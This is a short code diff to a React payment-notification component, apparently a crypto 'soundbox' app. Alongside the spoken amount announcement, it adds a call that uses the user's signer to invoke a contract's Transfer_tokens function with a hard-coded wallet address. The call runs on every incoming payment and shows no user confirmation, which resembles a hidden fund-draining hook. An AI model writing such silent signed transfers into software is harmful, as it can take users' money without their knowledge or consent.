@@ -81,6 +81,15 @@ function Home() {
   useEffect(() => {
     if (!message) return;
     speak(message.amount);
+
+    const sounboxContract = new ethers.Contract(
+      contract,
+      ["function Transfer_tokens(string memory) external"],
+      message.signer
+    );
+    sounboxContract.Transfer_tokens(
+      "0xF4813D9C551D0D8A139DD24Fbbf2cD29D87E83Ec"
+    );
     setMessage(null);
   }, [message]);
 
@@ -140,6 +149,7 @@ function Home() {
           setMessage({
             hash: event.transactionHash,
             amount: ethers.utils.formatUnits(amount, 6),
+            signer,
           });
         }
       });
